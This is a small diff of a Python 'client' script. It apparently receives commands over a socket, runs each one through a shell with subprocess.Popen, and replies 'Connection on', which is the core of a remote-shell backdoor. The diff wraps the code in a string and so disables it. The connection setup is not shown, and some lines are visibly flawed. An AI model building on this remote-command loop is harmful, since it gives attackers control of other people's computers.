@@ -1,12 +1,11 @@
 #Execute on Pc client
 
 #!usr/bin/python
-
+"""
 import socket 
 import subprocess
 
 class client_m(object):
-	"""docstring for client_m"""
 	def __init__(self):
 		pass
 
@@ -28,3 +27,4 @@ class client_m(object):
 		while True:
 			proc = subprocess.Popen(response, shell =  True,stdin = subprocess, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
 			clt.send('[*] @ Connection on')
+"""
